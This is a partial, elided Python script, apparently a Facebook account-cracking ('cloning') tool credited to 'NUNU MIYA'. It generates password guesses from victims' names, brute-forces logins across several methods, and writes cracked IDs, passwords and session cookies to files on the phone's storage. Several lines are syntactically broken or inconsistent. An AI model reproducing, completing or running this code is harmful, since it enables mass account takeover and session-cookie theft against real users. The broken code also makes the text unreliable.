...
\_/  \|\____/\_/  \|\____/         
----------------------------------------------
\033[1;37m[+] Author       :       NUNU MIYA 
\033[1;37m[+] Github       :       https://github.com/NUNU MIYA 
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('firstlast123')
                                        plist.append('Md+frs+islam')
                                        plist append('Md+frs+khan')
                                        pwv.append(frs+'123')
					                    pwv.append(frs+'1234')
	             			...
	             			if len(frs)<3:
		            			pwv.append(nmf)
			                		...
			                		pwv.append('I love you free fire')
				                	pwv.append(frs+'420')
			                		pwv.append(frs+'1122')
			                		pwv.append(frs+'24')
					                pwv.append('@@@###')
					                pwv.append('I love you ma')
					                pwv.append(frs+'@@11')
					                pwv.append(frs+'@@22')
					                pwv.append('@#$_&-+()/')
					                pwv.append('@@'frs+'12'
					                ...
					                pwv.append('1234557890')
					                pwv.append('@@@@@@')
					                pwv.append('######')
					                pwv.append('0987654321'
					                pwv.append('654321')
					                pwv.append('098765')
					                pwv.append('I love you ff')
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/{xx}');menu()
                        elif xd in ['7','07']:
                                os.system("xdg-open wa.me/+923231243")               
                        elif xd in ['0','00']:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m [NUNU-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NUNU_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NUNU_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #open('/sdcard/NUNU-M1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NUNU-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NUNU-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [NUNU-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NUNU_OK_ids_M2.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NUNJ_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              #  open('/sdcard/NUNU-M2-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [NUNU-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NUNJ_OK_ids_M3.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/JUTT_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               # open('/sdcard/NUNU-M3-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
...
def graph1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [NUNU-M4] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [NUNU-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NUNU_OK_ids_M4.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NUNU_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                           #     open('/sdcard/NUNU-M4-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [NUNU-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NUNU-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [NUNJ-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NUNU-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
